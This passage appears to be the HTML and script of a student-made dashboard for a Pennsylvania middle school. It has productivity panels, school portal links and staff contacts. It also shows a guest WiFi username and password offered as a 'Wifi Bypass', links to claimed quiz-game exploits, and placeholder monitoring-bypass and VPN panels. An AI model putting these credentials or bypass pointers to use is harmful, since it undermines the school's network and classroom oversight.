    <!-- Additional functional buttons below quick-bar -->
    <div class="quick-panel-buttons" style="margin-top: 30px;">
      <button onclick="dashboard.togglePanel('reminderPanel')">üîî Reminder System</button>
      <button onclick="dashboard.togglePanel('taskManagerPanel')">‚úÖ Task Manager</button>
      <button onclick="dashboard.togglePanel('courseProgressPanel')">üìà Course Progress</button>
      <button onclick="dashboard.togglePanel('quickNotesPanel')">üìù Quick Notes</button>
      <button onclick="dashboard.togglePanel('passwordGeneratorPanel')">üîí Password Generator</button>
      <button onclick="dashboard.togglePanel('personalLinksPanel')">üîó Personalized Links</button>
      <button onclick="dashboard.togglePanel('timezoneConverterPanel')">‚è±Ô∏è Timezone Converter</button>
      <button onclick="dashboard.togglePanel('settingsPanel')">‚öôÔ∏è Settings</button>
    </div>


    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 10px;">
      <button onclick="dashboard.togglePanel('wifiPanel')">üì° School WiFi Information</button>
      <button onclick="dashboard.togglePanel('ipadPanel')">üì± School iPad Restrictions</button>
      <button onclick="dashboard.togglePanel('handbookPanel')">üìò Student Handbooks Information</button>
      <button onclick="dashboard.togglePanel('mapPanel')">üè´ School Building Map Information</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel')">üåê Student Website's Information</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">üë©‚Äçüè´ Teacher Websites Information</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">üìû School Phone Directory Information</button>
      <button onclick="dashboard.togglePanel('cameraPanel')">üì∑ School Camera Information</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel')">üè´ School Information</button>
      <button onclick="dashboard.togglePanel('exploitPanel')">üß® Exploiting Tools</button>
      <button onclick="dashboard.togglePanel('bypassPanel')">üö™ Bypassing Tools</button>
      <button onclick="dashboard.togglePanel('vpnPanel')">üîê VPN Websites</button>
      <button onclick="dashboard.togglePanel('gamingPanel')">üéÆ Gaming Websites</button>
      <button onclick="dashboard.togglePanel('musicPanel')">üéµ Music Websites</button>
      <button onclick="dashboard.togglePanel('keyboardPanel')">üéπ Keyboard Tricks</button>
    </div>

    <!-- Information Panels -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">

      <!-- NEW PANELS START HERE -->

      <!-- Reminder System Panel -->
      <div id="reminderPanel" class="info-panel">
        <h2>üîî Reminder System</h2>
        <form id="reminderForm">
          <label for="reminderText">Reminder Description:</label>
          <input type="text" id="reminderText" placeholder="e.g., Biology Test" required style="width: 100%; margin-bottom: 10px;"/>
          <label for="reminderDateTime">Due Date and Time:</label>
          <input type="datetime-local" id="reminderDateTime" required style="width: 100%; margin-bottom: 10px;"/>
          <button type="submit" id="addReminderBtn">Add Reminder</button>
        </form>
        <div id="reminderList">
          <h3>Your Reminders:</h3>
          <ul id="reminders">
            <!-- Reminders will be loaded here -->
          </ul>
        </div>
      </div>

      <!-- Student Task Manager Panel -->
      <div id="taskManagerPanel" class="info-panel">
        <h2>‚úÖ Student Task Manager</h2>
        <div style="display: flex; margin-bottom: 15px;">
            <input type="text" id="taskInput" placeholder="Add a new task..." />
            <button id="addTaskBtn">Add Task</button>
        </div>
        <div id="taskList">
            <ul id="tasks">
                <!-- Tasks will be loaded here -->
            </ul>
        </div>
      </div>

      <!-- Course Progress Tracker Panel -->
      <div id="courseProgressPanel" class="info-panel">
        <h2>üìà Course Progress Tracker</h2>
        <form id="progressForm">
            <div>
                <label for="courseName">Course Name:</label>
                <input type="text" id="courseName" required />
            </div>
            <div>
                <label for="assignmentName">Assignment Name:</label>
                <input type="text" id="assignmentName" required />
            </div>
            <div>
                <label for="scoreObtained">Score Obtained:</label>
                <input type="number" id="scoreObtained" min="0" max="100" required />
            </div>
            <div>
                <label for="totalScore">Total Score:</label>
                <input type="number" id="totalScore" min="1" required />
            </div>
            <button type="submit" id="addGradeBtn">Add Grade</button>
        </form>
        <div id="progressReport">
            <h3>Overall Progress:</h3>
            <ul id="courseProgressList">
                <!-- Course progress will be displayed here -->
            </ul>
            <p><strong>Overall Average: <span id="overallAverage">N/A</span></strong></p>
        </div>
      </div>

      <!-- Quick Notes & Idea Pad Panel -->
      <div id="quickNotesPanel" class="info-panel">
        <h2>üìù Quick Notes & Idea Pad</h2>
        <textarea id="notesArea" placeholder="Jot down your quick thoughts and ideas here..."></textarea>
        <button id="saveQuickNotesBtn" style="margin-top: 10px;">Save Notes</button>
        <p style="margin-top: 10px; font-size: 0.9em;">Notes are saved automatically when you type and load when you open the panel.</p>
      </div>

      <!-- Password Generator Panel -->
      <div id="passwordGeneratorPanel" class="info-panel">
        <h2>üîí Password Generator</h2>
        <div id="passwordOutput"></div>
        <div class="slider-container">
            <label for="passwordLength">Password Length: <span id="lengthValue">12</span></label>
            <input type="range" id="passwordLength" min="6" max="64" value="12">
        </div>
        <div class="checkbox-group">
            <label><input type="checkbox" id="includeUppercase" checked> Uppercase (A-Z)</label>
            <label><input type="checkbox" id="includeLowercase" checked> Lowercase (a-z)</label>
            <label><input type="checkbox" id="includeNumbers" checked> Numbers (0-9)</label>
            <label><input type="checkbox" id="includeSymbols"> Symbols (!@#$%^&*)</label>
        </div>
        <button id="generatePasswordBtn">Generate Password</button>
        <button id="copyPasswordBtn" style="margin-left: 10px;">Copy Password</button>
      </div>

      <!-- Personalized Links/Bookmarks Panel -->
      <div id="personalizedLinksPanel" class="info-panel">
        <h2>üîó Personalized Links</h2>
        <div style="display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px;">
            <input type="text" id="newLinkName" placeholder="Link Name (e.g., Google)" style="flex: 1 1 48%;"/>
            <input type="url" id="newLinkURL" placeholder="https://example.com" style="flex: 1 1 48%;"/>
            <button id="addPersonalLinkBtn" style="flex: 1 1 100%;">Add New Link</button>
        </div>
        <div class="links-grid" id="personalLinksGrid">
            <!-- Personalized links will be loaded here -->
        </div>
      </div>

      <!-- Timezone Converter Panel -->
      <div id="timezoneConverterPanel" class="info-panel">
        <h2>‚è±Ô∏è Timezone Converter</h2>
        <div>
            <label for="sourceTime">Source Time:</label>
            <input type="datetime-local" id="sourceTime" />
        </div>
        <div>
            <label for="sourceTimezone">Source Timezone:</label>
            <select id="sourceTimezone"></select>
        </div>
        <div>
            <label for="targetTimezone">Target Timezone:</label>
            <select id="targetTimezone"></select>
        </div>
        <button id="convertTimeBtn">Convert Time</button>
        <div id="convertedTime">Select times and timezones to convert.</div>
      </div>

      <!-- Settings Panel -->
      <div id="settingsPanel" class="info-panel">
        <h2>‚öôÔ∏è Settings</h2>
        <div class="setting-group">
            <h3>Theme Settings</h3>
            <label>
                <input type="checkbox" id="autoThemeToggle"> Automatically switch theme based on time (Light: 6AM-6PM)
            </label>
        </div>
        <div class="setting-group">
            <h3>Notification Settings</h3>
            <label>
                <input type="checkbox" id="enableNotifications" checked> Enable Notifications
            </label>
            <label>
                <input type="checkbox" id="enableNotificationSound" checked> Enable Notification Sound
            </label>
            <label for="notificationVolume">Notification Volume: <span id="notificationVolumeValue">50%</span></label>
            <input type="range" id="notificationVolume" min="0" max="100" value="50" style="width: 100%;">
            <button id="notificationSoundTest" style="margin-top: 5px;">Test Sound</button>
            <label style="margin-top: 10px;">
                <input type="checkbox" id="disableLongNotifications"> Disable Long Notifications (auto-dismiss faster)
            </label>
        </div>
        <div class="setting-group">
            <h3>Display Settings</h3>
            <label>
                <input type="checkbox" id="enableAnimations" checked> Enable UI Animations
            </label>
        </div>
        <!-- More settings could go here -->
      </div>

      <!-- EXISTING PANELS (unchanged structure, just for completeness) -->

      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>üì° School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div>Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div>Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>üì± School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <p>Coming soon</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>üìò Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>üè´ School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>üåê Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>üë©‚Äçüè´ Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>üìû School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>üì∑ School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>üè´ School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>üß® Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>üö™ Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming1Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming2Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming3Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>üîê VPN Websites</h2>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>üéÆ Gaming Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>üéµ Music Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>üéπ Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
‚Ä¢ Access Spotlight Search: Press¬†Command (‚åò) + Space bar.
‚Ä¢ Return to the Home screen: Press¬†Command (‚åò) + H.
‚Ä¢ Show the Dock: Press¬†Command (‚åò) + Option (‚å•) + D.
‚Ä¢ Show the App Library: Press¬†Shift (‚áß) + Globe + A.
‚Ä¢ Open Quick Note: Press Globe + Q.
‚Ä¢ Open Siri: Press Globe + S.
‚Ä¢ Open Control Center: Press Globe + C.
‚Ä¢ Open Notification Center: Press Globe + N.
‚Ä¢ Show all windows: Press¬†Globe + Down Arrow.
‚Ä¢ Open the App Switcher: Press¬†Globe + Up Arrow.
Multitasking Shortcuts:
‚Ä¢ Switch to the last active app: Press¬†Command (‚åò) + Tab.
‚Ä¢ View all active apps: Press and hold Command (‚åò) + Tab.
‚Ä¢ Open Split View: Press Control (‚åÉ) + Globe + Left Arrow to move an app to the left, or Control (‚åÉ) + Globe + Right Arrow to move it to the right.
‚Ä¢ Switch the position of apps in Split View: Press¬†Control (‚åÉ) + Globe + Left or Right Arrow.
‚Ä¢ Open Slide Over: Press Globe + Backslash.
‚Ä¢ Move the Slide Over window: Press¬†Option (‚å•) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
‚Ä¢ Take a full-screen screenshot: Press¬†Command (‚åò) + Shift + 3.
‚Ä¢ Take a screenshot and enter markup immediately: Press¬†Command (‚åò) + Shift + 4.
‚Ä¢ Open a new private tab: Press¬†Command (‚åò) + Shift + N.
‚Ä¢ Open a new tab: Press Command (‚åò) + T or Command (‚åò) + N.
‚Ä¢ Close the current tab: Press Command (‚åò) + W.
‚Ä¢ Close all tabs in Tab Grid: Press Shift + Command (‚åò) + W.
‚Ä¢ Go to the next tab: Press Option (‚å•) + Command (‚åò) + Right Arrow, or Control (‚åÉ) + Tab, or Command (‚åò) + }.
‚Ä¢ Go to the previous tab: Press Option (‚å•) + Command (‚åò) + Left Arrow, or Shift + Control (‚åÉ) + Tab, or Command (‚åò) + {.
‚Ä¢ Reopen the last closed tab: Press¬†Shift + Command (‚åò) + T.
‚Ä¢ Go to a specific tab (1-8): Press¬†Command (‚åò) + (1-8).
‚Ä¢ Go to the last tab: Press Command (‚åò) + 9.
‚Ä¢ Open the Tab Grid: Press Shift + Command (‚åò) + .
‚Ä¢ Open a new Incognito tab: Press¬†Shift + Command (‚åò) + N.
‚Ä¢ Open a new Incognito window: Press¬†Option (‚å•) + Shift + Command (‚åò) + N.
‚Ä¢ Open a new window: Press¬†Option (‚å•) + Command (‚åò) + N.
General Navigation and Text Editing:
‚Ä¢ Navigate between elements in an app (like fields, lists, buttons): Press Tab.
‚Ä¢ Select all text: Press Command (‚åò) + A.
‚Ä¢ Copy selected text: Press Command (‚åò) + C.
‚Ä¢ Cut selected text: Press Command (‚åò) + X.
‚Ä¢ Paste copied text: Press Command (‚åò) + V.
‚Ä¢ Undo the last action: Press Command (‚åò) + Z.
‚Ä¢ Redo the last undone action: Press Command (‚åò) + Shift + Z.
‚Ä¢ Jump to the top of a page: Press Command (‚åò) + Up Arrow.
‚Ä¢ Jump to the bottom of a page: Press Command (‚åò) + Down Arrow.
‚Ä¢ Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using,¬†press and hold the Command (‚åò) key.¬†For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>
    </div>

    <div id="canvasContainer">
      <h2>üñåÔ∏è Notes Canvas</h2>
      <canvas id="notesCanvas" width="600" height="400"></canvas>
      <div id="canvasControls">
        <button id="clearCanvasBtn">Clear Canvas</button>
        <button id="closeCanvasBtn">Close Notes</button>
      </div>
    </div>
  </div>

  <script>
    // --- Global Utility & Loading System ---
    const globalState = {
        theme: localStorage.getItem('theme') || 'dark-theme',
        animationsEnabled: localStorage.getItem('animationsEnabled') !== 'false', // Default true
        notificationsEnabled: localStorage.getItem('notificationsEnabled') !== 'false', // Default true
        notificationSoundEnabled: localStorage.getItem('notificationSoundEnabled') !== 'false', // Default true
        notificationVolume: parseFloat(localStorage.getItem('notificationVolume') || '0.5'),
        disableLongNotifications: localStorage.getItem('disableLongNotifications') === 'true', // Default false
        lastInteractionTime: Date.now(),
        notificationSound: new Audio('https://www.soundjay.com/buttons/beep-01a.mp3') // Simple notification sound
    };

    // Notification System Core
    const notificationSystem = {
      container: document.getElementById('notificationContainer'),
      maxNotifications: 5,
      notificationQueue: [],

      // Type: 'default', 'success', 'warning', 'error'
      addNotification: function(message, type = 'default', duration = 3000) {
        if (!globalState.notificationsEnabled) return;

        if (globalState.notificationSoundEnabled) {
            globalState.notificationSound.volume = globalState.notificationVolume;
            globalState.notificationSound.play().catch(e => console.error("Error playing notification sound:", e));
        }

        const notificationDiv = document.createElement('div');
        notificationDiv.classList.add('notification', type);
        notificationDiv.innerHTML = `
            <span>${message}</span>
            <button class="close-btn" aria-label="Dismiss notification">&times;</button>
        `;
        
        notificationDiv.querySelector('.close-btn').onclick = () => {
            notificationSystem.dismissNotification(notificationDiv);
        };

        this.container.appendChild(notificationDiv);
        this.notificationQueue.push(notificationDiv);

        if (this.notificationQueue.length > this.maxNotifications) {
          this.dismissNotification(this.notificationQueue[0]);
        }

        const actualDuration = globalState.disableLongNotifications && duration > 2000 ? 2000 : duration;

        setTimeout(() => {
          this.dismissNotification(notificationDiv);
        }, actualDuration);
      },

      dismissNotification: function(notificationDiv) {
        if (!notificationDiv || !notificationDiv.parentNode) return;
        notificationDiv.classList.add('exiting'); // Start exit animation
        const index = this.notificationQueue.indexOf(notificationDiv);
        if (index > -1) {
          this.notificationQueue.splice(index, 1);
        }
        setTimeout(() => {
            if(notificationDiv.parentNode) notificationDiv.remove();
        }, parseFloat(getComputedStyle(notificationDiv).animationDuration || '0.5s') * 1000); // Remove after animation
      },

      // Convenience functions
      info: function(message, duration) { this.addNotification(message, 'default', duration); },
      success: function(message, duration) { this.addNotification(message, 'success', duration); },
      warning: function(message, duration) { this.addNotification(message, 'warning', duration); },
      error: function(message, duration) { this.addNotification(message, 'error', duration); }
    };

    // Logging for notifications (just local log to console, webhook would be too much for every button press)
    function logAction(message, type = 'default') {
        // Here you could send to a lighter-weight logging service or just console log
        console.log(`Action Log [${type.toUpperCase()}]: ${message}`);
        notificationSystem.addNotification(message, type);
    }

    // Loading Overlay Logic
    async function showLoadingScreen(message, duration = 2000) {
      const loadingOverlay = document.getElementById('loadingOverlay');
      const loadingTextSpan = document.getElementById('loadingText');

      loadingTextSpan.textContent = message;
      loadingTextSpan.style.width = '0'; // Reset width for typing animation

      loadingOverlay.classList.add('active'); // Start fade-in

      // Reapply animation for new text (trick browser to restart animation)
      loadingTextSpan.style.animation = 'none';
      loadingTextSpan.offsetHeight; /* trigger reflow */
      loadingTextSpan.style.animation = `typing ${duration / 2000 * 3.5}s steps(${message.length}, end), blink-caret .75s step-end infinite`;


      return new Promise(resolve => {
        setTimeout(() => {
          loadingOverlay.classList.remove('active'); // Start fade-out
          setTimeout(resolve, 500); // Resolve after fade-out transition
        }, duration);
      });
    }

    // --- Dashboard functionality object ---
    const dashboard = {
      // Internal state
      _activePanel: null,
      _reminders: [],
      _tasks: [],
      _courses: [],
      _quickNotes: "",
      _personalizedLinks: [],
      _quotes: [
        "\"The only way to do great work is to love what you do.\" ‚Äì Steve Jobs",
        "\"Believe you can and you're halfway there.\" ‚Äì Theodore Roosevelt",
        "\"The future belongs to those who believe in the beauty of their dreams.\" ‚Äì Eleanor Roosevelt",
        "\"It always seems impossible until it's done.\" ‚Äì Nelson Mandela",
        "\"Success is not final, failure is not fatal: It is the courage to continue that counts.\" ‚Äì Winston Churchill",
        "\"The best way to predict the future is to create it.\" ‚Äì Abraham Lincoln",
        "\"Start where you are. Use what you have. Do what you can.\" ‚Äì Arthur Ashe"
      ],

      // Initialize all dashboard functionality
      init: function() {
        this.loadSettings(); // Load settings before initializing
        this.applyTheme(globalState.theme); // Apply theme based on loaded settings
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons();
        this.initCanvas();
        this.initPanels(); // Hides all panels
        this.initNewFeatures(); // Specific init for reminder, tasks, etc.
        this.rotateMotivationQuote();
        this.checkRemindersLoop(); // Start reminder check loop
        notificationSystem.success("Dashboard loaded successfully! Welcome.", 3000);
      },

      // --- Settings Management ---
      loadSettings: function() {
          const storedTheme = localStorage.getItem('theme');
          if (storedTheme) globalState.theme = storedTheme;
          else { // Auto-theme for first time users
            const hour = new Date().getHours();
            globalState.theme = (hour >= 6 && hour < 18) ? 'light-theme' : 'dark-theme';
            localStorage.setItem('theme', globalState.theme);
          }

